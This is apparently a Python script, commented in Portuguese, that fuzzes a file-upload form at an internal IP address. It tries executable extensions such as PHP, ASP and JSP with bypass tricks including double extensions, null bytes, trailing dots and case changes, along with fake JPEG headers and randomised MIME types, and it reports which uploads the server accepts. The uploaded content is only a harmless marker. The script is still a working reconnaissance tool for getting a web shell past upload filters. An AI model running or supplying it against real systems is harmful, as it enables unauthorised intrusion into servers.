import requests
import os
import random
import string

URL = "http://192.168.9.117/internal/"
FIELD_NAME = "file"

EXTENSOES = [
    # comuns
    "txt","pdf","doc","docx","xls","xlsx",
    "jpg","jpeg","png","gif","bmp","webp","svg",

    # html/js
    "html","htm","shtml","js",

    # php
    "php","php3","php4","php5","php7","phtml","phar","inc",

    # asp
    "asp","aspx","ashx","cer",

    # jsp
    "jsp","jspx",

    # scripts
    "cgi","pl","py","rb"
]

MIMES = [
    "image/jpeg",
    "image/png",
    "text/plain",
    "application/octet-stream",
    "text/html",
    "application/x-php"
]

VARIANTES = [
    "{name}.{ext}",
    "{name}.{ext}.jpg",
    "{name}.jpg.{ext}",
    "{name}.{ext}.png",
    "{name}.{ext};.jpg",
    "{name}.{ext}%00.jpg",
    "{name}.{EXT}",
    "{name}.{Ext}",
    "{name}.{ext} ",
    "{name}.{ext}...",
]

def random_name(size=6):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(size))

def criar_arquivo(nome):
    with open(nome, "wb") as f:

        # fake jpg header
        if nome.endswith((".jpg", ".jpeg", ".png", ".gif")):
            f.write(b"\xff\xd8\xff\xe0")

        f.write(b"TESTE_UPLOAD")

def testar_upload(filename):

    mime = random.choice(MIMES)

    files = {
        FIELD_NAME: (
            filename,
            open(filename, "rb"),
            mime
        )
    }

    try:
        r = requests.post(
            URL,
            files=files,
            timeout=15,
            verify=False
        )

        permitido = (
            r.status_code in [200,201,202]
            and "nao permit" not in r.text.lower()
            and "not allowed" not in r.text.lower()
            and "invalid" not in r.text.lower()
        )

        status = "[ACEITO]" if permitido else "[BLOQUEADO]"

        print(f"{status} {filename} | HTTP {r.status_code}")

    except Exception as e:
        print(f"[ERRO] {filename} -> {e}")

def main():

    for ext in EXTENSOES:

        for modelo in VARIANTES:

            nome = random_name()

            filename = modelo.format(
                name=nome,
                ext=ext,
                EXT=ext.upper(),
                Ext=ext.capitalize()
            )

            criar_arquivo(filename)

            testar_upload(filename)

            try:
                os.remove(filename)
            except:
                pass

if __name__ == "__main__":
    requests.packages.urllib3.disable_warnings()
    main()
